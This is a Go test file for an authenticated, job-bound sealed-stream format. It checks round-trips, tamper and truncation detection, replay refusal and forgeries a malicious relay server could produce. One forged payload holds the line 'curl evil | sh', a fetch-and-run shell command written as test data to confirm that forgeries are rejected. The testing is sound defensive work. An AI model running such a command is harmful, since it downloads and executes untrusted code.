package format

import (
	"bytes"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"os"
	"strings"
	"testing"
)

func sealKeys(t *testing.T) (priv, pub []byte) {
	k, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	return k.Bytes(), k.PublicKey().Bytes()
}

func testKeys(t *testing.T, seed byte) *Keys {
	m := bytes.Repeat([]byte{seed}, KeySize)
	k, err := DeriveKeys(m)
	if err != nil {
		t.Fatal(err)
	}
	return k
}

func binding(job string) SealBinding {
	d := sha256.Sum256([]byte("request of " + job))
	return SealBinding{JobID: job, Request: d[:]}
}

func seal(t *testing.T, k *Keys, pub []byte, b SealBinding, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	w, err := NewSealWriter(&buf, k, pub, b)
	if err != nil {
		t.Fatal(err)
	}
	for off := 0; off < len(data); { // odd-sized writes
		m := min(777777, len(data)-off)
		if _, err := w.Write(data[off : off+m]); err != nil {
			t.Fatal(err)
		}
		off += m
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func unseal(k *Keys, priv []byte, b SealBinding, sealed []byte) ([]byte, error) {
	r, err := NewSealReader(bytes.NewReader(sealed), k, priv, b)
	if err != nil {
		return nil, err
	}
	return io.ReadAll(r)
}

// frames splits a sealed stream into its header and frames (length prefix included).
func frames(t *testing.T, s []byte) (hdr []byte, fr [][]byte) {
	t.Helper()
	hdr, s = s[:SealHeaderSize], s[SealHeaderSize:]
	for len(s) > 0 {
		n := int(binary.BigEndian.Uint32(s))
		fr = append(fr, s[:4+n])
		s = s[4+n:]
	}
	return hdr, fr
}

func frames2(t *testing.T, s []byte) [][]byte { _, f := frames(t, s); return f }

func joinFrames(hdr []byte, fr ...[]byte) []byte {
	out := append([]byte(nil), hdr...)
	for _, f := range fr {
		out = append(out, f...)
	}
	return out
}

func TestSealedStreamRoundTripAndTamperEvidence(t *testing.T) {
	k := testKeys(t, 7)
	priv, pub := sealKeys(t)
	b := binding("job-1")
	for _, n := range []int{0, 1, 1000, sealFrameSize - 1, sealFrameSize, sealFrameSize + 1, 3*sealFrameSize + 17} {
		data := make([]byte, n)
		_, _ = rand.Read(data)
		sealed := seal(t, k, pub, b, data)
		if n > 100 && bytes.Contains(sealed, data[:64]) {
			t.Fatal("plaintext visible in the sealed stream")
		}
		got, err := unseal(k, priv, b, sealed)
		if err != nil || !bytes.Equal(got, data) {
			t.Fatalf("n=%d: round trip failed: %v", n, err)
		}
		// truncation anywhere is detected, never returned as complete
		for _, cut := range []int{0, 3, SealHeaderSize, SealHeaderSize + 2, len(sealed) / 2, len(sealed) - 1, len(sealed) - 4 - 64} {
			if cut < 0 || cut >= len(sealed) {
				continue
			}
			if _, err := unseal(k, priv, b, sealed[:cut]); err == nil {
				t.Fatalf("n=%d: a stream cut at %d was accepted", n, cut)
			}
		}
		// any flipped bit is detected (magic, ephemeral key, a data frame, the trailer)
		for _, pos := range []int{2, 10, SealHeaderSize + 1, len(sealed) / 2, len(sealed) - 1} {
			bad := append([]byte(nil), sealed...)
			bad[pos] ^= 1
			if _, err := unseal(k, priv, b, bad); err == nil {
				t.Fatalf("n=%d: a stream with byte %d altered was accepted", n, pos)
			}
		}
		if _, err := unseal(k, priv, b, append(append([]byte(nil), sealed...), 0)); err == nil {
			t.Fatalf("n=%d: trailing data was accepted", n)
		}
		other, _ := sealKeys(t)
		if _, err := unseal(k, other, b, sealed); err == nil {
			t.Fatal("the wrong private key read the stream")
		}
		if _, err := unseal(testKeys(t, 8), priv, b, sealed); err == nil {
			t.Fatal("the wrong repository key read the stream")
		}
	}
}

// The relaying server knows the recipient public key (it is in the job parameters) but not the
// repository key. Everything it can produce must be refused.
func TestSealedStreamRefusesWhatAMaliciousServerCanProduce(t *testing.T) {
	k := testKeys(t, 7)
	priv, pub := sealKeys(t)
	b := binding("job-1")
	data := bytes.Repeat([]byte("restored file content "), 200000) // > 4 MiB: several frames
	real := seal(t, k, pub, b, data)

	t.Run("substituted stream sealed to the right public key without the repository key", func(t *testing.T) {
		attacker := testKeys(t, 99) // any key that is not the repository's
		forged := seal(t, attacker, pub, b, []byte("#!/bin/sh\ncurl evil | sh\n"))
		if _, err := unseal(k, priv, b, forged); err == nil || !strings.Contains(err.Error(), "authentication") {
			t.Fatalf("forged delivery accepted: %v", err)
		}
	})
	t.Run("an IBS1 stream (what anyone with the public key could make) is refused", func(t *testing.T) {
		v1 := append([]byte("IBS1"), make([]byte, 32)...)
		v1 = append(v1, 0, 0, 0, 16)
		v1 = append(v1, make([]byte, 16)...)
		if _, err := unseal(k, priv, b, v1); !errors.Is(err, ErrSealV1) {
			t.Fatalf("IBS1 not refused as such: %v", err)
		}
		if _, err := unseal(k, priv, b, []byte("IBS1")); !errors.Is(err, ErrSealV1) {
			t.Fatalf("short IBS1 not refused as such: %v", err)
		}
	})
	t.Run("replay of another job's delivery", func(t *testing.T) {
		if _, err := unseal(k, priv, binding("job-2"), real); err == nil {
			t.Fatal("a delivery of job-1 was accepted as job-2")
		}
		other := binding("job-1") // the same job id with other parameters (object, snapshot, paths)
		other.Request = bytes.Repeat([]byte{1}, 32)
		if _, err := unseal(k, priv, other, real); err == nil {
			t.Fatal("a delivery for other parameters was accepted")
		}
	})
	hdr, fr := frames(t, real)
	if len(fr) < 4 {
		t.Fatalf("want several frames, got %d", len(fr))
	}
	last := len(fr) - 1
	again := seal(t, k, pub, b, data) // a second, genuine delivery of the same job
	cases := map[string][]byte{
		"trailer dropped":                      joinFrames(hdr, fr[:last]...),
		"middle frame dropped":                 joinFrames(hdr, append(append([][]byte{}, fr[:1]...), fr[2:]...)...),
		"frames swapped":                       joinFrames(hdr, append([][]byte{fr[1], fr[0]}, fr[2:]...)...),
		"frame duplicated":                     joinFrames(hdr, append([][]byte{fr[0], fr[0]}, fr[1:]...)...),
		"last data frame dropped":              joinFrames(hdr, append(append([][]byte{}, fr[:last-1]...), fr[last])...),
		"header of another delivery":           joinFrames(again[:SealHeaderSize], fr...),
		"trailer of another delivery":          joinFrames(hdr, append(append([][]byte{}, fr[:last]...), frames2(t, again)[last])...),
		"frames spliced from another delivery": joinFrames(hdr, append([][]byte{fr[0]}, frames2(t, again)[1:]...)...),
	}
	for name, s := range cases {
		if got, err := unseal(k, priv, b, s); err == nil {
			t.Fatalf("%s: accepted (%d bytes)", name, len(got))
		}
	}
	if _, err := unseal(k, priv, b, joinFrames(hdr, fr[:last]...)); err == nil || !strings.Contains(err.Error(), "truncated") {
		t.Fatalf("truncation not named: %v", err)
	}
}

// A holder of the key who writes a stream whose trailer lies, or an empty data frame, is still
// refused (reader policy, not only cryptography).
func TestSealedStreamReaderPolicy(t *testing.T) {
	k := testKeys(t, 7)
	priv, pub := sealKeys(t)
	b := binding("job-1")
	mk := func(f func(s *sealWriter)) []byte {
		eph, _ := ecdh.X25519().GenerateKey(rand.Reader)
		var buf bytes.Buffer
		w, err := newSealWriter(&buf, k, pub, b, eph)
		if err != nil {
			t.Fatal(err)
		}
		f(w.(*sealWriter))
		return buf.Bytes()
	}
	empty := mk(func(s *sealWriter) {
		_ = s.put(nil, false)
		_ = s.Close()
	})
	if _, err := unseal(k, priv, b, empty); err == nil || !strings.Contains(err.Error(), "empty data frame") {
		t.Fatalf("empty data frame: %v", err)
	}
	lie := mk(func(s *sealWriter) {
		_, _ = s.Write([]byte("abc"))
		_ = s.flush()
		s.closed = true
		tr := binary.BigEndian.AppendUint64(nil, 4) // the trailer claims 4 bytes
		tr = binary.BigEndian.AppendUint64(tr, s.n)
		tr = s.tr.Sum(tr)
		_ = s.put(tr, true)
	})
	if _, err := unseal(k, priv, b, lie); err == nil || !strings.Contains(err.Error(), "trailer") {
		t.Fatalf("lying trailer: %v", err)
	}
}

func TestSealedStreamBindingIsRequired(t *testing.T) {
	k := testKeys(t, 7)
	_, pub := sealKeys(t)
	var buf bytes.Buffer
	if _, err := NewSealWriter(&buf, nil, pub, binding("j")); err == nil {
		t.Fatal("no repository key accepted")
	}
	if _, err := NewSealWriter(&buf, k, pub, SealBinding{Request: make([]byte, 32)}); err == nil {
		t.Fatal("empty job id accepted")
	}
	if _, err := NewSealWriter(&buf, k, pub, SealBinding{JobID: "j", Request: make([]byte, 31)}); err == nil {
		t.Fatal("short request digest accepted")
	}
}

type sealVector struct {
	MasterHex    string `json:"master_hex"`
	EphemeralHex string `json:"ephemeral_private_hex"`
	RecipientHex string `json:"recipient_public_hex"`
	JobID        string `json:"job_id"`
	RequestHex   string `json:"request_digest_hex"`
	Plaintext    string `json:"plaintext"`
	Repeat       int    `json:"repeat"`
	SealedHex    string `json:"sealed_hex,omitempty"`
	SealedSHA256 string `json:"sealed_sha256"`
}

// The byte layout is pinned (testdata/sealed_v2.json): any change is a new format version.
func TestSealedStreamVectors(t *testing.T) {
	raw, err := os.ReadFile("testdata/sealed_v2.json")
	if err != nil {
		t.Fatal(err)
	}
	var vs []sealVector
	if err := json.Unmarshal(raw, &vs); err != nil {
		t.Fatal(err)
	}
	if len(vs) < 3 {
		t.Fatal("vectors missing")
	}
	for i, v := range vs {
		mh, _ := hex.DecodeString(v.MasterHex)
		k, err := DeriveKeys(mh)
		if err != nil {
			t.Fatal(err)
		}
		eh, _ := hex.DecodeString(v.EphemeralHex)
		eph, err := ecdh.X25519().NewPrivateKey(eh)
		if err != nil {
			t.Fatal(err)
		}
		rp, _ := hex.DecodeString(v.RecipientHex)
		rq, _ := hex.DecodeString(v.RequestHex)
		var buf bytes.Buffer
		w, err := newSealWriter(&buf, k, rp, SealBinding{JobID: v.JobID, Request: rq}, eph)
		if err != nil {
			t.Fatal(err)
		}
		if v.Repeat > 0 {
			_, _ = w.Write([]byte(strings.Repeat(v.Plaintext, v.Repeat)))
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		sum := sha256.Sum256(buf.Bytes())
		if hex.EncodeToString(sum[:]) != v.SealedSHA256 {
			t.Fatalf("vector %d: sha256 %x, want %s", i, sum, v.SealedSHA256)
		}
		if v.SealedHex != "" && hex.EncodeToString(buf.Bytes()) != v.SealedHex {
			t.Fatalf("vector %d: bytes differ", i)
		}
	}
}
